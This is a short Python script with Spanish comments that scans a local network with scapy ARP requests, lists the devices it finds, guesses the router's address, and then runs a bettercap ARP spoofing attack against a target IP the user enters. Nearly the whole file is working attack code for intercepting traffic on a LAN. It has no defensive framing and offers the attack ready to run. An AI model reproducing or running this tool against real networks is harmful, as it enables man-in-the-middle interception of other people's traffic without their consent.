import subprocess
import scapy.all as scapy

# Esta función escanea la red utilizando ARP para descubrir dispositivos activos.
# Envía solicitudes ARP a todas las direcciones IP en el rango especificado
# y recopila información sobre los dispositivos que responden.
def escanear_red(rango_ip):
    solicitud_arp = scapy.ARP(pdst=rango_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    solicitud_broadcast_arp = broadcast / solicitud_arp
    lista_contestados = scapy.srp(solicitud_broadcast_arp, timeout=2, verbose=False)[0]
    dispositivos = []
    for elemento in lista_contestados:
        info_dispositivo = {"ip": elemento[1].psrc, "mac": elemento[1].hwsrc}
        dispositivos.append(info_dispositivo)
    return dispositivos

# Esta función intenta identificar automáticamente la IP y MAC del router
# asumiendo que su dirección IP termina en '.1'
def obtener_info_router(dispositivos):
    for dispositivo in dispositivos:
        if dispositivo['ip'].endswith('.1'):
            return dispositivo['ip'], dispositivo['mac']
    return None, None

# Esta función muestra en pantalla la lista de dispositivos encontrados en la red
def mostrar_dispositivos(dispositivos):
    print("Dispositivos en la red:")
    for idx, dispositivo in enumerate(dispositivos):
        print(f"{idx + 1}. IP: {dispositivo['ip']}, MAC: {dispositivo['mac']}")

# Esta función ejecuta el ataque de ARP spoofing utilizando la herramienta bettercap
def arp_spoofing(ip_router, ip_objetivo):
    subprocess.call(["bettercap", "-eval", f"set arp.spoof.targets {ip_objetivo}; set arp.spoof.gateway {ip_router}; arp.spoof on"])

# Esta es la función principal que coordina el flujo del programa
def main():
    rango_ip = "192.168.64.0/24"  # Rango de IP específico
    dispositivos_encontrados = escanear_red(rango_ip)
    if dispositivos_encontrados:
        mostrar_dispositivos(dispositivos_encontrados)
        ip_router, mac_router = obtener_info_router(dispositivos_encontrados)
        
        if ip_router:
            print(f"IP del Router detectada automáticamente: {ip_router}")
        else:
            ip_router = input("Ingresa la IP de la puerta de enlace (router): ")
        ip_objetivo = input("Ingresa la IP del dispositivo objetivo: ")
        if ip_router and ip_objetivo:
            arp_spoofing(ip_router, ip_objetivo)
        else:
            print("IPs no válidas.")
    else:
        print("No se encontraron dispositivos en la red.")

# Este bloque asegura que la función main() se ejecute
# solo si el script se ejecuta directamente
if __name__ == "__main__":
    main()
